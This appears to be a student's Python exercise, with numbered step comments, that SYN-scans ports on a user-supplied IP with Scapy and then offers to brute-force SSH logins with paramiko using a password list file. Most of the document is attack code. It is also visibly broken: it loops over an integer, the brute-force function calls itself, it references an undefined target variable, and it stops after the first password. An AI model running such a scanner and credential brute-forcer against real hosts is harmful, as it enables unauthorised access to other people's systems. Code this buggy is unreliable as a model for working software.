# 2 - Install the Scapy library

import importlib
import subprocess

# Checking if the "scapy" library is already installed
try:
    importlib.import_module("scapy")
except ImportError:
    print("The 'scapy' library has not been installed yet. Installing scapy now...")
    try:
        subprocess.check_call(["pip3", "install", "scapy"])
        print("The 'scapy' library has been installed.")
    except Exception as e:
        print(f"There is a problem with 'scapy' installation: {e}")

# 3 - Import all the sub-libraries from "scapy.all"

from scapy.all import *
from scapy.layers.inet import TCP, IP
from scapy.data import TCP_SERVICES
from scapy.sendrecv import sr1

# 4: Create the variable "Target" and assign user input to it.

target = input("Target IP: ")

print(f"Scanning target IP: {target}")

# 6: Create an empty list called "open_ports"

open_ports = []

# 7: Create the "scanport" function

def scanport(port):
    src_port = RandShort()

    try:
        # 8: Set "conf.verb" to 0 to prevent the functions from printing unwanted messages
        conf.verb = 0

        # 9: Create a Synchronization Packet variable "SynPkt"
        SynPkt = sr1(IP(dst=target) / TCP(sport=src_port, dport=port, flags="S"), timeout=0.5, verbose=False)

        # 10: Check if the Synchronization Packet exists
        if not SynPkt:
            return False

        # 11: Check if it has a TCP layer
        if not SynPkt.haslayer(TCP):
            return False

        # 12: Check if flags are equal to 0x12 (18 in decimal)
        if SynPkt[TCP].flags == SA:
            return SynPkt
        else:
            return False

    except Exception as w:
        # 16: Print the exception and return False
        print(f"An exception occurred while scanning port {port}: {w}")
        return False

# 5: Create the variable "Registered_Ports" that equals a range of 1 to 1023 (all registered ports)
# 21: Create a loop that goes over the "Registered_Ports" variable range.

Registered_Ports = 22
# range(1, 1024)

for port in Registered_Ports:
    result = scanport(port)
    if result:
        data = TCP_SERVICES[result.sport]
        print(f"[o] Port {port} is opened as {data}")
        open_ports.append(port)

# 13: Send an RST flag to close the active connection and return True

def close_connection(target, source_port, port):
    rst_pkt = sr(IP(dst=target)/TCP(sport=source_port, dport=port, flags='R'), timeout=2)
    return True

# 14: Create a function that checks target availability

def check_target_availability(target):
    response = sr1(IP(dst=target)/ICMP(), timeout=1, verbose=False)
    if response:
        return True
    else:
        return False

# 19: Under "try" and "except" methodology, check if the ICMP packet was sent and returned successfully. If this is the situation, return "True" at the end of the block

try:
    icmp_response = sr1(IP(dst=target)/ICMP(), timeout=3)
    if icmp_response:
        print("ICMP packet sent and returned successfully.")
except Exception as e:
    print(f"An exception occurred while sending ICMP packet: {e}")

# 20: Create an IF statement that uses the availability check function to test whether the target is available

if check_target_availability(target):
    print(f"Target {target} is available.")
else:
    print(f"Target {target} is not available.")

print("Open ports:", open_ports)

# 21 - I already have one loop line 11 included in #5, so there is no need to create another and risk it to go for the ports more than once

# 22 - Create a "status" variable that is equal to the port scanning function with the port as Its argument

status = scanport(port)

# 23 -  If the status variable is equal to True, append the port to the "Open_Ports" list and print the open port

if status == True:
    open_ports.append(port)
    print(f"[o] Port {port} is open.")

# 24: After the loop finishes, print a message stating that the scan finished

print(f"Scan finished. {len(open_ports)} open ports found.")

# 25 - Import the "paramiko" library.

# Checking if the "paramiko" library is already installed
try:
    importlib.import_module("paramiko")
except ImportError:
    print("The 'paramiko' library has not been installed yet. Installing paramiko now...")
    try:
        subprocess.check_call(["pip", "install", "paramiko"])
        print("The 'paramiko' library has been installed.")
    except Exception as e:
        print(f"There is an issue with 'paramiko' installation: {e}")

import paramiko

# 26 - Create a "BruteForce" function that takes the port variable as an argument
# 38 - After the main functionality loop, under the line that prints "Finished scanning", create another IF statement that checks if 22 exist in the port list and return open ports
# 39 - If port is open, check if a user wants to perform a Brute-Force action on that port (formulate a question with a "yes" or "no" answer)
# 40 - If the user responds with a "y" or "Y" (yes) answer, start the brute-force function while sending it the port as the argument

def BruteForce(port):
    if 22 in open_ports:
        user_input = input("Port 22 is open. Do you want to perform a Brute-Force attack on this port? (yes/no): ")
        if user_input.lower() in ["yes", "y"]:
            print("Starting Brute-Force attack on port 22...")
            BruteForce(22)  # Launching the Brute-Force Attact on port 22.
        else:
            print("Brute-Force attack on port 22 not performed.")
    else:
        print("Port 22 is not open.")
# 27 - Use the "with" method to open the "PasswordList.txt"

    with open("PasswordList.txt", "r") as PasswordList_file:

# 28 - Create a wordlist that the user read the file from Python code and assign the password value to a password variable

        passwords = PasswordList_file.read().splitlines()

# 29 - Under the "with" method, create one variable called "user" to allow the user to select the SSH server's login username

        user = input("Enter SSH username: ")

# 30 - Create the variable "SSHconn" that equals to the "paramiko.SSHClient()" function.

        SSHConn = paramiko.SSHClient()

# 31 - Apply the ".set_missing_host_key_policy(paramiko.AutoAddPolicy())" function to the "SSHConn" variable

        SSHConn.set_missing_host_key_policy(paramiko.AutoAddPolicy())

# 32 - Create a loop for each value in the "passwords" variable

        for password in passwords:

# 33 - Implement "try" and "except" methodology. In case of an exception, the function will print "<The password variable> failed."
# 34 - Connect to SSH using "SSHconn.connect(Target, port=int(port ), username=user, password=password, timeout = 1)
# 35 - Print the password with a success message
# 36 - Close the connection with "SSHconn.close()"
# 37 - Break the loop
            try:
                SSHConn.connect(Target, port=int(port), username=user, password=password, timeout=1)
                print(f"Success! Password found: {password}")
            except Exception as e:
                print(f"{password} failed.")
            finally:
                SSHConn.close()
            break